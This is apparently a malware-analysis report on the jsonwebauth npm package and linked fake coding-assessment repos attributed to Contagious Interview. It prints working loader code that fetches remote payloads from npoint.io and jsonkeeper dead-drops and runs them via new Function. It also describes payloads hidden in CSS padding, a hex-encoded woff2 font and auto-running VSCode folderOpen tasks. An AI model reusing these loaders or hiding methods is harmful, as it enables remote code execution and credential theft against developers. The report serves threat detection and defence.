# Task AD: `jsonwebauth` npm Package — Payload Analysis

## Overview

`jsonwebauth` v1.1.7 was published to npm on 2026-01-08 and removed by npm on 2026-01-21 (13
days live). It was surfaced by Abstract Security's Contagious Interview tracking report. The
package contains a 326KB obfuscated payload in `lib/lserver.js`.

**Key finding: This is NOT PolinRider. This is the Contagious Interview (Lazarus / Famous
Chollima) cluster — no shared IOCs with the PolinRider TRON blockchain campaign.**

---

## Package Metadata

| Field | Value |
|-------|-------|
| Name | `jsonwebauth` |
| Version | 1.1.7 |
| Published | 2026-01-08T14:48:51Z |
| Removed | 2026-01-21T04:25:56Z |
| Time live | 13 days |
| Payload file | `lib/lserver.js` |
| Payload size | 326KB |
| Publisher | Unknown (npm cleared maintainer metadata on takedown) |

The package impersonates `dotenv` — victim code does:
```javascript
const dotenv = require('jsonwebauth');  // actor's instruction to victim
app.use(dotenv());
```
This makes the package appear to be a configuration middleware. Neither the name (JWT auth) nor the
usage (dotenv middleware) is consistent — a red flag visible in hindsight.

The tarball and v1.1.7 registry metadata are fully purged from npm CDN and all mirrors.
Wayback Machine did not archive the tarball. The 326KB `lserver.js` payload could not be retrieved.

---

## Delivery Chain

The npm package is NOT standalone — it is part of a multi-vector attack delivered through fake
coding-assessment repositories sent to developer victims (classic Contagious Interview pretext).

```
Victim receives "coding assessment" repo link
  │
  └─ Clone repo → open in VSCode
       │
       ├─ VSCode folderOpen task (auto-triggers silently):
       │    cd backend && npm install > /dev/null 2>&1 &&
       │    nohup npm run start > /dev/null 2>&1 &
       │         │
       │         └─ npm install installs jsonwebauth@1.1.7
       │              └─ lib/lserver.js (326KB) executes on require()
       │
       └─ Separately: server.js does require('jsonwebauth') on startup
            └─ Same 326KB payload executes again via app.use(dotenv())
```

The VSCode task ensures `npm install` runs automatically before the victim does anything.

---

## Victim Repositories

Three victim repos confirmed, all created within 11 days of each other (Jan 5–16, 2026):

| Repo | Created | App type | Delivery |
|------|---------|----------|----------|
| `chocoscoding/hmmm` | 2026-01-05 | Supply chain / blockchain dashboard | VSCode task → `globals_light.css` (obfuscator.io) |
| `arliawhite/rentverse` | 2026-01-14 | Rental marketplace (fork of fiverr-demo) | VSCode task → `server/data/util/conf.js` → hex woff2 |
| `Harshavardhan-28/sequence-web-assessment` | 2026-01-16 | Food delivery app | VSCode task → `npm install` → `jsonwebauth` |
| `paalgyula/react-fe-exam` | 2025-06-20 | React frontend exam | VSCode task → inline `node -e` payload |

All repos have `"runOn": "folderOpen"` tasks disguised as `eslint-check` or `Test Scripts`.
The bait projects are all realistic full-stack apps a developer would be asked to review or extend
in a job interview context.

---

## Payload Variants Found (without jsonwebauth)

Two additional payload variants were recovered from the victim repos:

### Variant A — `globals_light.css` (chocoscoding/hmmm, 21KB)

Obfuscator.io-style IIFE hidden after 215 spaces of CSS comment padding.

**Execution chain:**
```javascript
// Writes dropper to disk:
fs.writeFileSync('/root/Programs_X64/main.js', dropper_code);

// Installs deps and launches:
exec('npm init -y && npm install fs axios better-sqlite3 node-machine-id socket.io-client @primno/dpapi');
spawn('node', ['main.js'], { cwd: '/root/Programs_X64', detached: true, stdio: 'ignore' });
```

**main.js dropper fetches:**
```javascript
const url = 'https://api.npoint.io/b8750e273f78138d8842';
const res = await axios.get(url);
const handler = new Function('require', res.data.credits);
handler(require);
```

**C2**: `https://api.npoint.io/b8750e273f78138d8842` — **NEUTRALIZED** (someone replaced payload
with `{"cookie":"alert('This is a malicious site...')"}`)

**npm packages installed:** `axios`, `better-sqlite3`, `node-machine-id`, `socket.io-client`,
`@primno/dpapi`
- `better-sqlite3` — reads Chrome/browser SQLite databases (cookies, credentials)
- `node-machine-id` — victim fingerprinting
- `socket.io-client` — Stage 3 backdoor channel
- `@primno/dpapi` — Windows DPAPI decryption (browser master keys)

### Variant B — hex-encoded `fa-brands-regular.woff2` (arliawhite/rentverse, 11KB)

Loader in `server/data/util/conf.js`:
```javascript
const hex = fs.readFileSync('.../webfonts/fa-brands-regular.woff2', 'utf8').replace(/[^0-9a-f]/gi, '');
const src = Buffer.from(hex, 'hex').toString('utf8');
new Function('require', 'module', 'exports', '__filename', '__dirname', src)(...);
```

Decoded payload (5.6KB obfuscator.io IIFE) writes main.js via shell echo and launches:
```bash
cd /root && mkdir "Programs_X64" && cd Programs_X64 && echo "
  const url  = 'https://jsonkeeper.com/b/ZRBXC';
  const url1 = 'https://jsonkeeper.com/b/GLGT4';
  axios.get(url, {headers: {'x-secret-header': 'secret'}}).then(res => {
    new Function('require', res.data.cookie)(require);
  });
  axios.get(url1, {headers: {'x-secret-header': 'secret'}}).then(res => {
    new Function('require', res.data.cookie)(require);
  });
" > main.js && npm init -y && npm install axios request
node main.js  [detached]
```

**C2**: two redundant jsonkeeper dead-drops, auth header `x-secret-header: secret`
**Dead-drop field**: `res.data.cookie`

### Variant C — inline `node -e` in tasks.json (paalgyula/react-fe-exam)

```javascript
h=require('https');
(async()=>{
  u=Buffer.from('aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9RSlpDRw==','base64')+'';
  d=await new Promise((r,j)=>{h.get(u,s=>{b='';s.on('data',c=>b+=c).on('end',()=>r(JSON.parse(b)));}).on('error',j);});
  new Function('require', Buffer.from(d.model,'base64')+'')(require);
})();
```

No intermediate file — payload fetched and evaled directly in the folderOpen task.
**Dead-drop field**: `d.model` (base64-encoded payload)

---

## C2 Dead-drops

All dead-drops are on public JSON pastebin services and are all currently **dead (404 or neutralized)**:

| URL | Service | Field | Status | Repo |
|-----|---------|-------|--------|------|
| `https://api.npoint.io/b8750e273f78138d8842` | npoint.io | `credits` | Neutralized (replaced with warning) | chocoscoding/hmmm |
| `https://jsonkeeper.com/b/ZRBXC` | jsonkeeper.com | `cookie` | Dead (404) | arliawhite/rentverse |
| `https://jsonkeeper.com/b/GLGT4` | jsonkeeper.com | `cookie` | Dead (404) | arliawhite/rentverse (backup) |
| `https://www.jsonkeeper.com/b/QJZCG` | jsonkeeper.com | `model` | Dead (404) | paalgyula/react-fe-exam |
| `https://www.jsonkeeper.com/b/85QGH` | jsonkeeper.com | `model` | Dead (404) | BestCity cluster |

**jsonkeeper.com is shared with BestCity cluster** — same dead-drop service, different endpoints.

---

## Relationship to BestCity Cluster

| Property | jsonwebauth / Coding-Assessment cluster | BestCity cluster |
|----------|-----------------------------------------|-----------------|
| Dead-drop | jsonkeeper.com (+ npoint.io) | jsonkeeper.com |
| Dead-drop field | `cookie` / `model` / `credits` | `model` |
| Dropper path | `/root/Programs_X64/main.js` | `/tmp/programx64/main.js` |
| VSCode task label | `eslint-check` / `Test Scripts` | `eslint-check` |
| Payload file disguise | `.css`, `.woff2`, inline `node -e` | `.woff2` |
| Obfuscation | obfuscator.io | 3-layer WJS IIFE (self-keying XOR) |
| Fake git history | No | Yes (100 commits, 4 personas) |
| npm package vector | Yes (`jsonwebauth`) | No |
| Pretext | Coding assessment (real apps) | Fake job interview |
| C2 status | All dead | Dead |

These are likely the same actor (Contagious Interview / Lazarus) with different campaign variants
operated by the same team. The shared infrastructure (jsonkeeper.com, dropper path pattern,
task label) points to the same toolset; the operational differences (obfuscation style, pretext,
npm vector) suggest different sub-campaigns or time periods.

---

## IOCs

| Type | Value |
|------|-------|
| npm package | `jsonwebauth@1.1.7` |
| Dropper path | `/root/Programs_X64/main.js` |
| Dead-drop | `https://api.npoint.io/b8750e273f78138d8842` |
| Dead-drop | `https://jsonkeeper.com/b/ZRBXC` |
| Dead-drop | `https://jsonkeeper.com/b/GLGT4` |
| Dead-drop | `https://www.jsonkeeper.com/b/QJZCG` |
| Auth header | `x-secret-header: secret` (jsonkeeper fetches in rentverse variant) |
| npm deps installed | `axios`, `request`, `better-sqlite3`, `node-machine-id`, `socket.io-client`, `@primno/dpapi` |
| VSCode task labels | `eslint-check`, `Test Scripts` |
| Payload files | `src/app/globals_light.css`, `webfonts/fa-brands-regular.woff2`, `server/data/util/conf.js` |
| Victim repos | `chocoscoding/hmmm`, `arliawhite/rentverse`, `Harshavardhan-28/sequence-web-assessment`, `paalgyula/react-fe-exam` |

---

## Assessment

**Attribution**: Contagious Interview / Lazarus / Famous Chollima — high confidence.
- Fake job-interview / coding-assessment pretext
- VSCode `folderOpen` silent execution vector
- jsonkeeper.com public JSON pastebin dead-drop (shared with BestCity cluster)
- `new Function('require', payload)(require)` execution pattern
- All C2 is dead — cluster appears inactive

**Relationship to PolinRider**: **None.** No TRON wallets, no Aptos addresses, no BSC dead-drops,
no XOR cipher keys, no shared C2 IPs. The only shared element with PolinRider is the VSCode
`folderOpen` delivery vector — independently adopted by both actor groups.

**lserver.js (326KB) — not recovered.** Tarball fully purged from npm CDN and all mirrors.
Based on npm deps installed by Variant A (`socket.io-client`, `better-sqlite3`, `@primno/dpapi`),
the Stage 2 is likely a socket.io backdoor + credential theft tool consistent with OtterCookie
or a custom variant — standard Contagious Interview Stage 3/4/5 capabilities.
